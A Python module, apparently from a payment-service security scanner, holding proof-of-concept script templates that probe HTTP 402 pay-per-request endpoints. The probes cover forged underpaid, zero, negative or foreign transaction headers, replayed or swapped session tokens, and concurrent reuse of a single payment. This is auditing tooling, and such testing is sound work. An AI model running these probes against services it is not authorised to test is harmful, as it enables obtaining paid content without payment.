from __future__ import annotations

POC_TEMPLATES: dict[str, str] = {
    "PRICE-001": """
import httpx

# PoC: Underpayment by 1 micro-USDC
# The service accepts payments that are 1 unit below the required amount.
target = "{target}"
resp = httpx.get(target, headers={{"X-Payment-Tx": "fake_underpay_tx"}})
print(f"Status: {{resp.status_code}}  (200 = vulnerable)")
""",
    "PRICE-002": """
import httpx

# PoC: Decimal confusion — 18 decimals instead of 6
target = "{target}"
resp = httpx.get(target, headers={{"X-Payment-Tx": "fake_decimal_tx"}})
print(f"Status: {{resp.status_code}}  (200 = vulnerable)")
""",
    "PRICE-003": """
import httpx

# PoC: Float representation attack
target = "{target}"
resp = httpx.get(target, headers={{"X-Payment-Tx": "fake_float_tx"}})
print(f"Status: {{resp.status_code}}  (200 = vulnerable)")
""",
    "PRICE-004": """
import httpx

# PoC: Negative amount accepted
target = "{target}"
resp = httpx.get(target, headers={{"X-Payment-Tx": "fake_negative_tx"}})
print(f"Status: {{resp.status_code}}  (200 = vulnerable)")
""",
    "PRICE-005": """
import httpx

# PoC: Zero amount accepted
target = "{target}"
resp = httpx.get(target, headers={{"X-Payment-Tx": "fake_zero_tx"}})
print(f"Status: {{resp.status_code}}  (200 = vulnerable)")
""",
    "PRICE-006": """
import httpx

# PoC: Integer overflow (2^256 - 1)
target = "{target}"
resp = httpx.get(target, headers={{"X-Payment-Tx": "fake_overflow_tx"}})
print(f"Status: {{resp.status_code}}  (200 = vulnerable)")
""",
    "SESS-001": """
import httpx

# PoC: Session token replay — use same token twice
target = "{target}"
session_id = "{session_id}"
headers = {{"X-Payment-Session": session_id, "X-Payment-Tx": "valid_tx"}}
r1 = httpx.get(target, headers=headers)
r2 = httpx.get(target, headers=headers)
print(f"First: {{r1.status_code}}, Second: {{r2.status_code}}  (both 200 = vulnerable)")
""",
    "SESS-002": """
import httpx

# PoC: Expired session token accepted
target = "{target}"
headers = {{"X-Payment-Session": "{session_id}", "X-Payment-Tx": "valid_tx"}}
# This token's expires_at has passed
resp = httpx.get(target, headers=headers)
print(f"Status: {{resp.status_code}}  (200 = vulnerable)")
""",
    "SESS-003": """
import httpx

# PoC: Session ID swap — use token from session A in session B
target = "{target}"
resp = httpx.get(target, headers={{"X-Payment-Session": "wrong_session", "X-Payment-Tx": "valid_tx"}})
print(f"Status: {{resp.status_code}}  (200 = vulnerable)")
""",
    "SESS-004": """
import httpx

# PoC: Missing expires_at field in 402 response
target = "{target}"
resp = httpx.get(target)
has_expires = "X-Payment-Expires" in resp.headers
print(f"Has expires_at: {{has_expires}}  (False = vulnerable)")
""",
    "RACE-001": """
import httpx
import asyncio

# PoC: Race condition — same payment used for multiple requests
async def exploit():
    target = "{target}"
    headers = {{"X-Payment-Tx": "single_valid_tx"}}
    async with httpx.AsyncClient() as c:
        tasks = [c.get(target, headers=headers) for _ in range(10)]
        results = await asyncio.gather(*tasks)
        ok = sum(1 for r in results if r.status_code == 200)
        print(f"Got {{ok}}/10 successes  (>1 = vulnerable)")

asyncio.run(exploit())
""",
    "RACE-002": """
import httpx
import asyncio

# PoC: TOCTOU — send payment then race
async def exploit():
    target = "{target}"
    async with httpx.AsyncClient() as c:
        tasks = [c.get(target, headers={{"X-Payment-Tx": "valid_tx"}}) for _ in range(10)]
        results = await asyncio.gather(*tasks)
        ok = sum(1 for r in results if r.status_code == 200)
        print(f"Got {{ok}}/10 successes  (>1 = vulnerable)")

asyncio.run(exploit())
""",
    "OVER-001": """
import httpx

# PoC: Overcharging — declared amount vs actual charge
target = "{target}"
resp = httpx.get(target)
declared = int(resp.headers.get("X-Payment-Amount", 0))
# Compare with on-chain deduction
print(f"Declared: {{declared}} micro-USDC — verify against actual chain deduction")
""",
    "OVER-002": """
import httpx

# PoC: Cumulative overcharge over multiple requests
target = "{target}"
total_declared = 0
for i in range(10):
    resp = httpx.get(target)
    total_declared += int(resp.headers.get("X-Payment-Amount", 0))
print(f"Total declared for 10 requests: {{total_declared}} — verify vs chain")
""",
    "VRFY-001": """
import httpx

# PoC: Foreign txhash accepted as payment
target = "{target}"
resp = httpx.get(target, headers={{"X-Payment-Tx": "0xdeadbeef_foreign_tx"}})
print(f"Status: {{resp.status_code}}  (200 = vulnerable)")
""",
    "VRFY-002": """
import httpx

# PoC: Underpaid txhash accepted
target = "{target}"
resp = httpx.get(target, headers={{"X-Payment-Tx": "0xunderpaid_tx"}})
print(f"Status: {{resp.status_code}}  (200 = vulnerable)")
""",
    "VRFY-003": """
import httpx

# PoC: Unconfirmed (pending) txhash accepted
target = "{target}"
resp = httpx.get(target, headers={{"X-Payment-Tx": "0xpending_tx"}})
print(f"Status: {{resp.status_code}}  (200 = vulnerable)")
""",
    "INJ-001": """
import httpx

# PoC: Invalid destination address accepted in 402
target = "{target}"
resp = httpx.get(target)
dest = resp.headers.get("X-Payment-Destination", "")
print(f"Destination: {{dest}} — check if format is validated")
""",
    "INJ-002": """
import httpx

# PoC: Invalid EIP-55 checksum address
target = "{target}"
resp = httpx.get(target, headers={{"X-Payment-Destination": "0xINVALIDCHECKSUM"}})
print(f"Status: {{resp.status_code}}  (200 = vulnerable)")
""",
    "DOS-001": """
import httpx
import time

# PoC: Measure delivery rate
target = "{target}"
success = 0
for i in range(20):
    resp = httpx.get(target, headers={{"X-Payment-Tx": f"valid_tx_{{i}}"}})
    if resp.status_code == 200:
        success += 1
rate = success / 20 * 100
print(f"Delivery rate: {{rate}}%  (<95% = unreliable)")
""",
    "DOS-002": """
import httpx

# PoC: Timeout with no refund
target = "{target}"
try:
    resp = httpx.get(target, headers={{"X-Payment-Tx": "valid_tx"}}, timeout=1.0)
except httpx.TimeoutException:
    print("Timeout — check if refund mechanism exists")
""",
    "DOS-003": """
import httpx

# PoC: Pay-and-no-deliver ratio check
target = "{target}"
paid = 0
delivered = 0
for i in range(20):
    resp = httpx.get(target, headers={{"X-Payment-Tx": f"valid_tx_{{i}}"}})
    paid += 1
    if resp.status_code == 200:
        delivered += 1
ratio = (paid - delivered) / paid * 100
print(f"No-deliver ratio: {{ratio}}%  (>5% = vulnerable)")
""",
    "DOS-004": """
import httpx

# PoC: Recursive billing detection
target = "{target}"
resp = httpx.get(target, headers={{"X-Payment-Tx": "valid_tx"}})
# Check response for sub-service 402 references
print("Check if response triggers additional 402 chains")
""",
}


def generate_poc(finding_id: str, evidence: dict) -> str:
    """Generate runnable PoC code for a finding."""
    template = POC_TEMPLATES.get(finding_id, "# No PoC template for {finding_id}")
    target = evidence.get("target", "http://target-service")
    session_id = evidence.get("session_id", "unknown")
    return template.format(
        finding_id=finding_id,
        target=target,
        session_id=session_id,
    )
